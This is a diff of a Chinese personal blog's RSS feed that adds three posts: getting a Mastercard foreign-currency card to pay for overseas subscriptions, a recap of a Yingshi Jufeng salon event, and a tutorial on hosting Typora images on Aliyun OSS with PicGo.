+<p>最后你就会得到一张银行卡,nice 完美结束</p>
+<h2 id="后记">后记</h2>
+<ul>
+<li>
+<p>办理完成之后就是后续的线上操作了，主要就是把其他银行卡的钱转到万事达的卡上，然后用万事达的卡去购汇就行了，nice！</p>
+</li>
+<li>
+<p>不足点</p>
+<ul>
+<li>不能绑定apple pay，支付和订阅不是很方便啊啊啊啊</li>
+</ul>
+</li>
+</ul>
+<h2 id="二阶段">二阶段</h2>
+<p>经过一段时间的摸索和测试，发现并不能流畅的使用双币卡，双币卡的直接好处在我的视角看来就是购汇，由于是一类卡直接绑定到网络上终归还是有些许的不放心，于是我又在中信银行的软件里面申请了一张万事达的纯外币卡（直接去官方软件搜索银行卡超市即可）</p>
+<p>办理了一张万事达纯外币卡</p>
+<p>尝试绑定google pay，成功，但是未使用</p>
+<p>尝试绑定Amazon，成功，第一次号被封了，可能是因为频繁切换IP地址，第二次绑定成功且购买成功</p>
+<p>购买了20$礼品卡，成功开通GPT会员（终于成功了）</p>
+<p>充完礼品卡顺表白嫖了两个月的apple TV，可以感受一下嘿嘿</p>
+<p>白嫖了半年的Amazon服务器会员，可以尝试自建代理</p>
+<p><img alt="image-20250904161922687" loading="lazy" src="https://mirrozer0.oss-cn-hangzhou.aliyuncs.com/image/20250904161922731.png"></p>
+<p><img alt="image-20250904161712704" loading="lazy" src="https://mirrozer0.oss-cn-hangzhou.aliyuncs.com/image/20250904161712814.png">、</p>
+<p><img alt="image-20250904162104948" loading="lazy" src="https://mirrozer0.oss-cn-hangzhou.aliyuncs.com/image/20250904162105009.png"></p>
+]]></content:encoded>
     </item>
     <item>
       <title>影视飓风线下沙龙</title>
@@ -1454,6 +2798,94 @@ curl -k -s --max-time 30 -H &amp;#34;User-Agent: Mozilla/5.0 (Macintosh; Intel M
 &lt;ul&gt;
 &lt;li&gt;
 &lt;p&gt;礼品方面还送了我们最新出的 iphone 拍摄课程，一张小卡片，直接扫码就可以获取非常方便&lt;/p&gt;</description>
+      <content:encoded><![CDATA[<h2 id="影视飓风-无限进步">影视飓风-无限进步</h2>
+<p>今天参加了影视飓风的活动，能从三万个人当中抽到我，我真的感到非常荣幸。这一次活动主要有五个阶段，我来说说我的情绪感受吧。</p>
+<hr>
+<h2 id="签到">签到</h2>
+<ul>
+<li>现场基本上是半开放式的，一部分人在室外，所以大家都感觉很热，这也许代表了我对影视飓风的热情吧。</li>
+<li>这期间有雪糕和茶，由于外面那比较热，最后工作人员把签到迁移到公司大厅了。</li>
+<li>签到之后是开场以及活动介绍，我们每个人可以打卡盖章 6 个活动。</li>
+<li>目前影视飓风的规模还不是特别大，目前只对我们开放了三个楼，不同的楼层作用于不同的功能。</li>
+<li>其中目前正在建设的比较大的是关于 club 的电商楼层。</li>
+</ul>
+<hr>
+<h2 id="开场活动介绍及自由活动">开场活动介绍及自由活动</h2>
+<p>活动主要有 6 个：</p>
+<ol>
+<li><strong>娃娃机：</strong> 这个活动的娃娃机其实是很好抓的，但是因为我瞄准一个目标到快结束的时候切换了，导致我最后什么也没抓到。虽说有些许可惜，但是也告诉我一个道理，那就是抓住一个目标不放，努力向前是最重要的。</li>
+<li><strong>手机大战：</strong> 拿着他们提供的手机进行攻击，我打了差不多 3k 多分，全场最高是 7k 多当时。我的核心思路是抓着 tim 打，不过最后我还是因为手速不够打的分并不高。</li>
+<li><strong>顶级视听：</strong> 里面有杜比视界的全套体验，那种震撼程度真的很高！人体工程学椅，环绕式的音响，顶级屏幕以及各种调音设备，播放的是他们公司自己拍摄的素材，每一个都很震撼。
+<ul>
+<li><em>（第三个活动之前我想参加飓风懂王的，但是由于我对于飓风的知识体系并不了解，所以我没敢去，去了顶级视听。）</em></li>
+</ul>
+</li>
+<li><strong>飞镖机：</strong> 我之前没有玩过飞镖，这是第一次玩飞镖，分数 25 好像是，并不高。体验的情绪价值拉满，这群人的情绪价值给的是在太到位，及时反馈也很快。</li>
+<li><strong>涩话口播：</strong> 这个活动我看了很久的话术字幕，还拍了一张练习。练习的太认真，导致后面另外的活动嘉宾看到我都跟我唠嗑的激动了。最后也还算完美的录制了一条涩话。</li>
+<li><strong>飓风懂王：</strong> 最后一个活动是我问了问其他嘉宾才有勇气参加的。飓风懂王这个活动对我来讲是最难的一个，涉及到近几年影视飓风发布并分享活动的细节。老实说我并没有很关注飓风所以我上去就坦白我不怎么会，给我一些简单的问题或者直接给我盖章。最后问了我关于飓风的设施被谁破坏的问题，我盲猜一个李思维，直接猜对了，特别惊喜，开心离场休息。</li>
+</ol>
+<hr>
+<h2 id="沙龙分享">沙龙分享</h2>
+<p>沙龙分享是同步线上直播的，不过令我印象比较深刻的也有几个：</p>
+<ul>
+<li>首先是关于之后的节目都会有类似于国外的野兽先生那种，投入大量的资金制作让普通人感觉离谱的中长度视频。期间介绍了之后要开始项目，比如荒岛求生，寻找大白鲨之类的，还有 tim 老师本人挑战 48 小时不睡觉等一系列活动。</li>
+<li>还有一些最新的自研技术以及未来的趋势分享，其中比较让 tim 老师震撼的就是 AI 了。现在剪辑视频基本上都是 AI 去剪，自动升成字幕，自动配音，甚至自动升成视频。期间给我们分享了一个有关于孙悟空在森林的视频，整体视频的流畅度非常高，几乎没有割裂感。所以我们的核心要注重于内容，不需要太过关注技巧，当然技巧还是蛮重要的。</li>
+<li>然后说了关于媒体创作的一些分享：
+<ul>
+<li>大部分人都喜欢花里胡哨的特效或者是剪辑技巧，但是仔细想想，人是情感动物，是社会关系的总和。如果我们真心表达一些创作流或者是一些普适性的东西会更佳真情实感。</li>
+<li>可以考虑 70% 的时间都放到记录情绪上面，然后单独记录美景。<strong>由情绪主导，美景加以辅助</strong>能够制作出一个比较有真实感的体验视频，这是主体。</li>
+<li>而剪辑方面主要是<strong>语义化剪辑</strong>，大概就是以文字为核心的剪辑，主要关注实际内容，最后慢慢添加细节。这些功能大部分的剪辑软件直接就是 AI 辅助的，非常方便。</li>
+</ul>
+</li>
+<li>如果是一名独立创作者，需要<strong>减少创作噪音</strong>：
+<ul>
+<li>尤其是 MCN 的邀请一定要谨慎，大部门的后台邀约都是卖你的课。</li>
+<li>商业化一定要走平台的结算系统，不然可能存在很多麻烦的坑，不要轻易尝试带货。</li>
+<li>这些东西会干扰你的创作核心，让你变得商业化，失去创造性，希望能<strong>坚持初心一直向上走</strong>。</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h2 id="关于礼品">关于礼品</h2>
+<ul>
+<li>礼品这方面给了全场一些惊喜：<strong>每人一个 AirPods4</strong> ，原因是给大家的天热招待不周的道歉（个人感觉这个招待还是拉满了，不愧是国内的顶流）。</li>
+<li>然后就是开始会有一份小礼品，结束又会有一份小礼品。</li>
+<li>其中一二三木头人是主体，寻找彩蛋的小活动我没有想着参加，原因是我希望自己关注一下整个公司的人文和环境，而不是刻意寻找。</li>
+</ul>
+<hr>
+<h2 id="谈一谈目前的自己">谈一谈目前的自己</h2>
+<ul>
+<li>对于刚毕业的我实在是比较迷茫，不知道如何继续向前走。</li>
+<li>早年间经常接触网络安全相关的内容，很想干技术，刚好赶上末班车，没上去。不过现在安全的环境烂的透透的，对于这方面的兴趣也日渐淡落了。</li>
+<li>参加完影视飓风的活动之后萌生了一点<strong>放眼看世界</strong>的想法，却不知自己如何开始，需要哪些准备，（至少要一门外语？学习人文地理的知识？各种环境法律法规的了解？）我不清楚，也不知道。</li>
+<li>总是有一种声音在告诉我<strong>沉淀一段时间，然后出发</strong>。</li>
+<li>不知道佬友们如何想，也不知道佬友们有何规划，尤其是对于刚毕业的学生来讲，唠嗑唠嗑，谈谈人生或许是最后的些许心灵净土。</li>
+</ul>
+<h2 id="补充一些信息">补充一些信息</h2>
+<ul>
+<li>
+<p>礼品方面还送了我们最新出的 iphone 拍摄课程，一张小卡片，直接扫码就可以获取非常方便</p>
+</li>
+<li>
+<p>tim 老师本人是非常幽默的，近距离给我的感受就是跟视频里面没什么区别，比较有趣的是在给我们推荐达芬奇的同时，达芬奇奔溃了</p>
+</li>
+<li>
+<p>公司内部的滑梯其中一个确实非常快，我体验了一下，直接滑出垫子一两米远的距离，还是非常刺激的</p>
+</li>
+<li>
+<p>活动期间奶茶咖啡不断供</p>
+</li>
+<li>
+<p>团队内会制作各种各样的有关于影视方面的小技巧工具，未来也会发布一些技术性的白皮书，这一块的各位可以关注一下</p>
+</li>
+<li>
+<p>AI 剪辑是利用达芬奇的云服务，所有的计算部分都依靠云厂商，商业版的达芬奇可以去看看，普通版本好像是不支持的，生成视频的大模型是 google 的veo3</p>
+</li>
+<li>
+<p>关于课程方面，tim 老师表示未来不会出很体系化的详细的课程，基本上都是制作入门的课程，tim 老师的理念是师傅领进门，修行靠个人，因为视频表达的核心其实还是人本身的情绪，而不是技术，技术可以通过需求来驱动，但是情感表达需要你自己来</p>
+</li>
+</ul>
+]]></content:encoded>
     </item>
     <item>
       <title>typora图片存储方案</title>
@@ -1494,6 +2926,46 @@ curl -k -s --max-time 30 -H &amp;#34;User-Agent: Mozilla/5.0 (Macintosh; Intel M
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;完成安装之后使用可能会有安全提示导致无法正常打开软件,输入下面的指令就可以了&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo xattr -rd com.apple.quarantine /Applications/PicGo.appa
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img alt=&#34;image-20250426153744177&#34; loading=&#34;lazy&#34; src=&#34;https://mirrozer0.oss-cn-hangzhou.aliyuncs.com/image/202504261537222.png&#34;&gt;&lt;/p&gt;</description>
+      <content:encoded><![CDATA[<h2 id="前言">前言</h2>
+<p>​	前段时间使用了obsdian ，不得不说这个笔记确实很棒，支持excalidraw 和各种丰富的插件，但是对于我这种需求不高的人来讲，似乎功能过剩了，经过一系列的体验下来我发现我还是喜欢 typora 这种简约风格，唯一的缺点就是图片存储这一块了，存在本地发给别人的时候别人看不到图片只能看到路径这很是尴尬，每一次都重新转成 pdf 也很尴尬，所以我就想使用云存储的方式来解决图片问题了。之前也写过 blog 之类的，结果因为图片实在是太麻烦了最后我连 blog 都删了，真是离谱哈。</p>
+<h2 id="前置条件">前置条件</h2>
+<ul>
+<li>typora</li>
+<li>picgo</li>
+<li>支付宝账号</li>
+</ul>
+<h2 id="如何使用-oss-存储">如何使用 OSS 存储</h2>
+<p>关于费用，普通用户的图片存储容量加上流量以及各种费用一年10 块钱都不到</p>
+<p>​	进入<a href="https://www.aliyun.com/product/oss">阿里云 oss 对象存储</a>这个页面可以看到如下内容</p>
+<p><img alt="image-20250426151314963" loading="lazy" src="https://mirrozer0.oss-cn-hangzhou.aliyuncs.com/image/202504261513028.png"></p>
+<p>​	点击立即开通一系列默认设置之后就可以进入如下页面了</p>
+<p><img alt="image-20250426151451976" loading="lazy" src="https://mirrozer0.oss-cn-hangzhou.aliyuncs.com/image/202504261514009.png"></p>
+<p>​	然后点击 Bucket 列表，创建 Bucket</p>
+<p><img alt="image-20250426152341184" loading="lazy" src="https://mirrozer0.oss-cn-hangzhou.aliyuncs.com/image/202504261523247.png"></p>
+<p><img alt="image-20250426152538426" loading="lazy" src="https://mirrozer0.oss-cn-hangzhou.aliyuncs.com/image/202504261525458.png"></p>
+<p>​	完成之后点击进去，找到文件列表新建目录，然后随便取一个名字</p>
+<p><img alt="image-20250426152755860" loading="lazy" src="https://mirrozer0.oss-cn-hangzhou.aliyuncs.com/image/202504261527895.png"></p>
+<p>​	然后找到公共访问，取消启用阻止公共访问</p>
+<p><img alt="image-20250426152904799" loading="lazy" src="https://mirrozer0.oss-cn-hangzhou.aliyuncs.com/image/202504261529835.png"></p>
+<p>​	读写权限选择公共读</p>
+<p><img alt="image-20250426152937127" loading="lazy" src="https://mirrozer0.oss-cn-hangzhou.aliyuncs.com/image/202504261529171.png"></p>
+<p>​	到这里，OSS 存储的设置基本上完成了，接下来鼠标放到右上角头像上，点击 accesskey</p>
+<p><img alt="image-20250426153105764" loading="lazy" src="https://mirrozer0.oss-cn-hangzhou.aliyuncs.com/image/202504261531803.png"></p>
+<p><img alt="image-20250426153151504" loading="lazy" src="https://mirrozer0.oss-cn-hangzhou.aliyuncs.com/image/202504261531551.png"></p>
+<p><img alt="image-20250426153216722" loading="lazy" src="https://mirrozer0.oss-cn-hangzhou.aliyuncs.com/image/202504261532782.png"></p>
+<p>​	创建完成之后可以下载这个访问文件，接下来就是配置 picgo 了</p>
+<h2 id="picgo-配置">picgo 配置</h2>
+<p>我使用的是 macbook 所以直接在终端输入</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>brew install --cask picgo
+</span></span></code></pre></div><p>完成安装之后使用可能会有安全提示导致无法正常打开软件,输入下面的指令就可以了</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo xattr -rd com.apple.quarantine /Applications/PicGo.appa
+</span></span></code></pre></div><p><img alt="image-20250426153744177" loading="lazy" src="https://mirrozer0.oss-cn-hangzhou.aliyuncs.com/image/202504261537222.png"></p>
+<p>设定完成之后就是 typora 的设置了</p>
+<h2 id="typora-配置">typora 配置</h2>
+<p>配置成下图样式就可以了</p>
+<p><img alt="image-20250426153846346" loading="lazy" src="https://mirrozer0.oss-cn-hangzhou.aliyuncs.com/image/202504261538388.png"></p>
+<p>然后可以验证一下图片上传选项，接下来就就可以畅快的写作了！！！</p>
+]]></content:encoded>
     </item>
   </channel>
 </rss>
